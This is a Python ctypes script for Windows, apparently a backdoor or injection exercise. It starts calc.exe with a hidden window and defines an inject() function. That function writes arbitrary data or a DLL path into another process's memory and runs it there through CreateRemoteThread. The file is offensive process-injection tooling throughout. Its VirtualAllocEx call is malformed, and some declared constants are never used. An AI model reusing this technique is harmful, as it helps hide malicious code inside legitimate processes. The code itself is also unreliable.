import sys
from ctypes import *
from my_debugger_defines import *

kernel32 = windll.kernel32

PAGE_EXECUTE_READWRITE = 0x00000040
PROCESS_ALL_ACCESS = (0x000F0000 | 0x00100000 | 0xFFF)
VIRTUAL_MEM = (0x1000 | 0x2000)

path_to_exe = "c:\\calc.exe"

startupinfo = STARTUPINFO()
process_information = PROCESS_INFORMATION()
creation_flags = CREATE_NEW_CONSOLE
startupinfo.dwFlags = 0x1
startupinfo.wShowWindow = 0x0
startupinfo.cb = sizeof(startupinfo)

kernel32.CreateProcessW(path_to_exe,
                        None,
                        None,
                        None,
                        None,
                        creation_flags,
                        None,
                        None,
                        byref(startupinfo),
                        byref(process_information))
pid = process_information.dwProcessId


def inject(pid, data, parameter=0):
    h_process = kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, int(pid))
    if not h_process:
        print("[*] Couldn't acquire a handle to PID: %s" % pid)
        sys.exit(0)
    arg_address = kernel32.VirtualAllocEx(
        h_process, 0, len(data), written=c_int(0))
    kernel32.WriteProcessMemory(
        h_process, arg_address, data, len(data), byref(written))
    thread_id = c_ulong(0)

    if not parameter:
        start_address = arg_address
    else:
        h_kernel32 = kernel32.GetModuleHandleW("kernel32.dll")
        start_address = kernel32.GetProcAddress(h_kernel32, "LoadLibraryW")
        parameter = arg_address

    if not kernel32.CreateRemoteThread(h_process, None, 0, start_address, parameter, 0, byref(thread_id)):
        print("[*] Failed to inject code. Exiting")
        sys.exit(0)
    return True
